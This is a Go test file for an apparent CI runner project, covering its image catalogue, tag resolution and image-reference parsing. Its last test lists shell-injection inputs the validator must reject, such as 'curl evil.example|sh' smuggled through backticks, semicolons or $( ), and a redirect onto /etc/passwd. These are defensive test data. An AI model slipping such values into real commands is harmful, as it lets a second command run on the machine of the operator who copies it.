package naming

import (
	"strings"
	"testing"
)

func TestCatalogueTagsMatchPoolNames(t *testing.T) {
	// An image tag and the OS half of a pool name are the same string by
	// construction. If that ever stops being true, a pool named for Ubuntu
	// 24.04 could quietly run a Debian image.
	for _, img := range Images() {
		spec := Spec{OS: img.OS, Version: img.Version}
		name := PoolName(spec)
		if !strings.HasSuffix(name, img.Tag()) {
			t.Errorf("pool name %q does not end in the image tag %q", name, img.Tag())
		}
		if got, want := img.Ref(), RunnerImageRepo+":"+img.Tag(); got != want {
			t.Errorf("Ref = %q, want %q", got, want)
		}
	}
}

func TestCatalogueIsWellFormed(t *testing.T) {
	defaults := 0
	seen := map[string]bool{}
	for _, img := range Images() {
		if NormalizeOS(img.OS) != img.OS {
			t.Errorf("catalogue entry %q is not a normalised OS", img.OS)
		}
		if img.Family != FamilyAPT && img.Family != FamilyDNF {
			t.Errorf("%s: family %q is not one deploy/Dockerfile.runner can drive", img.Tag(), img.Family)
		}
		if img.Base == "" {
			t.Errorf("%s: no base image", img.Tag())
		}
		if len(img.Arches) == 0 {
			t.Errorf("%s: published for no architecture", img.Tag())
		}
		for _, a := range img.Arches {
			if NormalizeArch(a) != a {
				t.Errorf("%s: architecture %q is not normalised", img.Tag(), a)
			}
		}
		if seen[img.Tag()] {
			t.Errorf("%s: duplicate tag", img.Tag())
		}
		seen[img.Tag()] = true
		if img.Default {
			defaults++
		}
	}
	if defaults != 1 {
		t.Errorf("the catalogue has %d default variants; :latest can only point at one", defaults)
	}
}

func TestFindImage(t *testing.T) {
	if img, ok := FindImage("ubuntu", "22.04"); !ok || img.Tag() != "ubuntu-2204" {
		t.Errorf("FindImage(ubuntu, 22.04) = %q, %v", img.Tag(), ok)
	}
	// An OS with no version gets whichever one we publish, preferring the
	// default, so a pool that says only "ubuntu" still starts.
	if img, ok := FindImage("Ubuntu", ""); !ok || img.Tag() != DefaultImage().Tag() {
		t.Errorf("FindImage(Ubuntu, \"\") = %q, %v; want the default variant", img.Tag(), ok)
	}
	// A version we do not publish is a miss, not a silent substitution.
	if _, ok := FindImage("ubuntu", "20.04"); ok {
		t.Error("FindImage substituted a different Ubuntu for one we do not publish")
	}
	if _, ok := FindImage("plan9", ""); ok {
		t.Error("FindImage claimed an operating system that is not in the catalogue")
	}
}

func TestRunnerImageFor(t *testing.T) {
	ref, ok := RunnerImageFor("debian", "12")
	if !ok || ref != RunnerImageRepo+":debian-12" {
		t.Errorf("RunnerImageFor(debian, 12) = %q, %v", ref, ok)
	}
	if ref, ok := RunnerImageFor("", ""); ok {
		t.Errorf("RunnerImageFor with no platform returned %q; the caller keeps its own default", ref)
	}
}

func TestImageSupports(t *testing.T) {
	img := DefaultImage()
	if !img.Supports("arm64") || !img.Supports("amd64") {
		t.Errorf("%s should be published for both architectures", img.Tag())
	}
	if !img.Supports("") {
		t.Error("an unstated architecture is not a mismatch")
	}
	if img.Supports("riscv64") {
		t.Error("Supports accepted an architecture nothing publishes")
	}
}

func TestDefaultRunnerImage(t *testing.T) {
	if got, want := DefaultRunnerImage(), RunnerImageRepo+":latest"; got != want {
		t.Errorf("DefaultRunnerImage = %q, want %q", got, want)
	}
	if !strings.Contains(SupportedPlatforms(), "Ubuntu 24.04") {
		t.Errorf("SupportedPlatforms = %q, which does not name the default", SupportedPlatforms())
	}
}

func TestRunnerImagesFollowBuildChannelAndKeepOverrides(t *testing.T) {
	original := RunnerImageTag
	t.Cleanup(func() { RunnerImageTag = original })
	for _, tag := range []string{"latest", "dev", "main", "sha-abc1234", "v1.2.3", "v1.3.0-rc1"} {
		t.Run(tag, func(t *testing.T) {
			RunnerImageTag = tag
			fallback := DefaultRunnerImage()
			if want := RunnerImageRepo + ":" + tag; fallback != want {
				t.Fatalf("default = %q, want %q", fallback, want)
			}
			for _, variant := range Images() {
				want := variant.Ref()
				if tag != "latest" {
					want += "-" + tag
				}
				if got := ResolveRunnerImage("", variant.OS, variant.Version, fallback); got != want {
					t.Errorf("platform %s = %q, want %q", variant.Tag(), got, want)
				}
			}
			for _, override := range []string{RunnerImageRepo + ":latest", "registry.example/runner:custom", "registry.example/runner@sha256:abcd"} {
				if got := ResolveRunnerImage(override, "debian", "12", fallback); got != override {
					t.Errorf("pool override changed to %q", got)
				}
				if got := ResolveRunnerImage("", "", "", override); got != override {
					t.Errorf("instance override changed to %q", got)
				}
			}
			if got := ResolveRunnerImage("", "", "", fallback); got != fallback {
				t.Errorf("fallback = %q, want %q", got, fallback)
			}
		})
	}
}

// SplitImage is tested on its own because its callers cannot reach half of
// it: a stock reference never carries a registry port, so the guard that keeps
// a port from being read as a tag is invisible through them -- a reference with
// one is refused for having the wrong repository long before the split matters.
// Asserting it here is what makes it a tested rule rather than a comment.
func TestSplitImageKeepsARegistryPortOutOfTheTag(t *testing.T) {
	const digest = "@sha256:8c2f1a9e5b3d4c6a7e8f0b1d2c3a4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f"
	for _, tc := range []struct{ ref, repo, tag, digest string }{
		{"ghcr.io/eyupio/zoomies:v1.2.3", "ghcr.io/eyupio/zoomies", ":v1.2.3", ""},
		{"ghcr.io/eyupio/zoomies", "ghcr.io/eyupio/zoomies", "", ""},
		// The colon belongs to the registry, and reading it as a tag would
		// leave the repository as a bare hostname that pulls nothing.
		{"registry.example.com:5000/zoomies", "registry.example.com:5000/zoomies", "", ""},
		{"registry.example.com:5000/zoomies:v1.2.3", "registry.example.com:5000/zoomies", ":v1.2.3", ""},
		// A digest has a colon of its own, inside it.
		{"ghcr.io/eyupio/zoomies" + digest, "ghcr.io/eyupio/zoomies", "", digest},
		{"ghcr.io/eyupio/zoomies:v1.2.3" + digest, "ghcr.io/eyupio/zoomies", ":v1.2.3", digest},
		{"registry.example.com:5000/zoomies" + digest, "registry.example.com:5000/zoomies", "", digest},
	} {
		t.Run(tc.ref, func(t *testing.T) {
			repo, tag, dg := SplitImage(tc.ref)
			if repo != tc.repo || tag != tc.tag || dg != tc.digest {
				t.Errorf("SplitImage(%q) = (%q, %q, %q), want (%q, %q, %q)",
					tc.ref, repo, tag, dg, tc.repo, tc.tag, tc.digest)
			}
		})
	}
}

// The rule the Docker swap rests on: a tag this build hands out is published
// for the stock runner image and its Docker variant by one step of one
// workflow, so it exists for both or for neither. A tag somebody pinned from
// another build promises nothing -- the registry carries eight commit tags for
// one image and not the other, from runs whose second build never finished --
// and moving a pool onto a tag that is not there would stop it running every
// job, including the ones that never touch Docker.
func TestPublishedRunnerTagAcceptsWhatThisBuildHandsOut(t *testing.T) {
	previous := RunnerImageTag
	t.Cleanup(func() { RunnerImageTag = previous })
	RunnerImageTag = "v1.4.0"
	variant := DefaultImage().Tag()
	for _, tag := range []string{
		"", ":latest", "latest", "main", "dev", "v1.4.0",
		variant, variant + "-main", variant + "-dev", variant + "-v1.4.0",
	} {
		if !PublishedRunnerTag(tag) {
			t.Errorf("PublishedRunnerTag(%q) = false; this build hands that tag out", tag)
		}
	}
	for _, tag := range []string{
		"sha-b966fb6", variant + "-sha-b966fb6", "v0.1-alpha", variant + "-v0.1-alpha",
		"alpine-3", "alpine-3-dev", "anything-else",
	} {
		if PublishedRunnerTag(tag) {
			t.Errorf("PublishedRunnerTag(%q) = true; nothing here publishes that tag", tag)
		}
	}
}

// An image reference is offered to an operator as the argument of a command
// they will copy, and the pool's image is free text, so only what is shaped like
// a reference may be put in one. Every reference the fleet uses has to pass, or
// a failed pull would stop offering the one command that shows the daemon's own
// answer.
func TestEveryImageReferenceTheFleetUsesMayBeOfferedAsACommandArgument(t *testing.T) {
	refs := []string{
		"ubuntu",
		"ubuntu:24.04",
		"library/ubuntu:24.04",
		"ghcr.io/eyupio/zoomies-runner:ubuntu-2404",
		"registry.example.com:5000/team/runner:v1.2.3_rc1",
		"localhost:5000/runner",
		"ghcr.io/eyupio/zoomies-runner@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
		"ghcr.io/eyupio/zoomies-runner:latest@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
		"Registry.Example.com/Team/Runner:V1",
	}
	for _, img := range Images() {
		refs = append(refs, img.Ref())
	}
	for _, ref := range refs {
		if !IsImageReference(ref) {
			t.Errorf("IsImageReference(%q) = false, want it offered", ref)
		}
	}
}

// Anything else would be copied into a shell, so each way text could break out
// of a command or turn into a second one has to be refused: the one the UI
// draws as a code span, the ones a shell reads, and a leading dash that docker
// would take for an option of its own.
func TestAnImageReferenceThatCouldBeMoreThanOneArgumentIsNotOfferedAsACommandArgument(t *testing.T) {
	for _, c := range []struct{ name, ref string }{
		{"nothing", ""},
		{"only spaces", "   "},
		{"a backtick pair around a command", "ghcr.io/a`curl evil.example|sh`b:1"},
		{"a lone backtick", "ghcr.io/a`b"},
		{"a semicolon", "ghcr.io/a:1;curl evil.example|sh"},
		{"a pipe", "ghcr.io/a:1|sh"},
		{"an ampersand", "ghcr.io/a:1&&sh"},
		{"a command substitution", "ghcr.io/$(curl evil.example)"},
		{"a variable", "ghcr.io/${HOME}"},
		{"a redirect", "ghcr.io/a:1>/etc/passwd"},
		{"a quote", "ghcr.io/a'b"},
		{"a space", "ghcr.io/a:1 --privileged"},
		{"a tab", "ghcr.io/a:1\t--privileged"},
		{"a line break", "ghcr.io/a:1\ncurl evil.example"},
		{"a leading space", " ghcr.io/a:1"},
		{"a leading dash", "--help"},
		{"a leading dot", ".hidden/a:1"},
		{"a backslash", `ghcr.io\a`},
		{"a wildcard", "ghcr.io/*"},
		{"letters outside ASCII", "ghcr.io/büro:1"},
		{"a reference too long to be one", strings.Repeat("a", 256)},
	} {
		t.Run(c.name, func(t *testing.T) {
			if IsImageReference(c.ref) {
				t.Errorf("IsImageReference(%q) = true, want it refused", c.ref)
			}
		})
	}
}
